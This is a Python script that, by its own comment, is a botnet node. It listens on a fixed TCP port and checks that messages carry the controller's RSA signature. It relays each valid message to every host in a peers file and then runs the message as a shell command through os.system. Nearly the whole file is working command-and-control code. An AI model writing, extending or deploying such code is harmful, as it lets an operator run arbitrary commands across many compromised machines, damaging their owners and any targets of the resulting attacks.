#!/usr/bin/python

import os
import sys
import datetime
import base64
import socket
import signal
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA512
from Crypto.PublicKey import RSA

LOCAL_IP = '0.0.0.0'
LOCAL_PORT = 25844 # just some random port
BUFSIZE = 2048 # good size, including ~340 chars of b64'd signature?

PEERS = []
CURRENTLY_PROPAGATING = []

def forward(data, peer):
  # send a message to an ip on port LOCAL_PORT (assumes entire botnet works on same port)
  print('forwarding message to ' + peer)
  try:
    client.connect((peer, LOCAL_PORT))
    client.sendall(data.encode())
    client.close()
  except:
    print('error forwarding to ' + peer)
    client.close()

def verify(message, sig):
  # check that a message is validly signed and not a repeat of one that was just recieved
  global CURRENTLY_PROPAGATING
  h = SHA512.new(message)

  prop_tmp = []
  for command in CURRENTLY_PROPAGATING:
    if (command[1] < datetime.datetime.now()):
      prop_tmp.append(command)
    if (command[0].hexdigest() == h.hexdigest()):
      CURRENTLY_PROPAGATING = prop_tmp
      return False
  CURRENTLY_PROPAGATING = prop_tmp

  if verifier.verify(h, base64.b64decode(sig)):
    CURRENTLY_PROPAGATING.append((h,datetime.datetime.now() + datetime.timedelta(minutes=1)))
    return True
  return False

def process(data):
  # deal with recieved messages
  message, sig = data.rsplit('[SIG]',1)
  if verify(message, sig):
    print('valid instruction ' + message)
    for peer in PEERS:
      forward(data, peer)
    os.system(message)
  else:
    print("signature invalid or repeat of a message that's still propagating")

# SETUP
print('setting up...')
serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv.bind((LOCAL_IP, LOCAL_PORT))
serv.listen(1)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

controller_pubkey = RSA.importKey(open('cascade_public.pem').read())
verifier = PKCS1_v1_5.new(controller_pubkey)

with open("peers.txt", "r") as peerfile:
  for line in peerfile:
    PEERS.append(line.rsplit('\n', 1)[0])


# RUNNING
while True:
  print('waiting for connection...')
  input, addr = serv.accept()
  print 'connection from ', addr
  data = input.recv(BUFSIZE)
  print('recieved:\n' + data)
  process(data)
  input.close()
